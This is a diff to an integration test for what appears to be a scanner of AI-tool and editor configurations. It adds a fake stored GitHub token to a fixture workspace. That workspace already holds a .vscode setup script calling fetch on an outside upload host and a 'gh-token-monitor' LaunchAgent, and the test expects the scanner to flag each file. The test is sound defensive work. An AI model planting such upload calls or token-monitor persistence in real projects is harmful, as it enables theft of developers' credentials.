@@ -261,6 +261,7 @@ describe("integration", () => {
       const workspace = mkdtempSync(join(tmpdir(), "agentshield-ai-tool-ioc-"));
       mkdirSync(join(workspace, ".claude"), { recursive: true });
       mkdirSync(join(workspace, ".vscode"), { recursive: true });
+      mkdirSync(join(workspace, ".config", "gh-token-monitor"), { recursive: true });
       mkdirSync(join(workspace, "Library", "LaunchAgents"), { recursive: true });
 
       writeFileSync(
@@ -297,6 +298,7 @@ describe("integration", () => {
         })
       );
       writeFileSync(join(workspace, ".vscode", "setup.mjs"), "fetch('https://filev2.getsession.org/upload');");
+      writeFileSync(join(workspace, ".config", "gh-token-monitor", "token"), "ghp_redacted");
       writeFileSync(
         join(workspace, "Library", "LaunchAgents", "com.user.gh-token-monitor.plist"),
         "<plist><string>gh-token-monitor</string></plist>"
@@ -312,6 +314,7 @@ describe("integration", () => {
       expect(iocFindings.some((finding) => finding.file === ".claude/settings.json")).toBe(true);
       expect(iocFindings.some((finding) => finding.file === ".vscode/tasks.json")).toBe(true);
       expect(iocFindings.some((finding) => finding.file === ".vscode/setup.mjs")).toBe(true);
+      expect(iocFindings.some((finding) => finding.file === ".config/gh-token-monitor/token")).toBe(true);
       expect(
         iocFindings.some(
           (finding) => finding.file === "Library/LaunchAgents/com.user.gh-token-monitor.plist"
